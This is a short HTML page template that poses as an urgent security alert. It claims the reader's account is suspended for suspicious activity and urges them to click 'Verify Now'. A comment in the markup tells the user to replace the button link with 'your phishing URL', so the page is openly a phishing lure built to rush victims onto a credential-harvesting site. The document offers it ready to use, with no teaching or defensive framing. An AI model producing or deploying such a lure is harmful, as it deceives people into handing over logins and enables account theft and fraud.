<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Urgent Security Alert</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 350px;
            text-align: center;
            border-top: 4px solid #e74c3c;
        }
        h1 {
            color: #2c3e50;
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }
        p {
            color: #7f8c8d;
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
            line-height: 1.4;
        }
        .cta-button {
            display: inline-block;
            background-color: #e74c3c;
            color: white;
            text-decoration: none;
            padding: 12px 24px;
            border-radius: 6px;
            font-weight: 600;
            font-size: 1rem;
            transition: background-color 0.2s ease;
            width: 100%;
            box-sizing: border-box;
            border: none;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(231, 76, 60, 0.3);
        }
        .cta-button:hover {
            background-color: #c0392b;
            transform: translateY(-1px);
        }
        .logo {
            width: 40px;
            height: 40px;
            background-color: #ecf0f1;
            border-radius: 50%;
            margin: 0 auto 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #e74c3c;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo">!</div>
        <h1>Account Suspended</h1>
        <p>Your account has been temporarily locked due to suspicious activity. Verify your identity immediately to restore access.</p>
        
        <!-- Replace the href below with your phishing URL -->
        <a href="https://your-phishing-site.com" class="cta-button">Verify Now</a>
    </div>

</body>
</html>
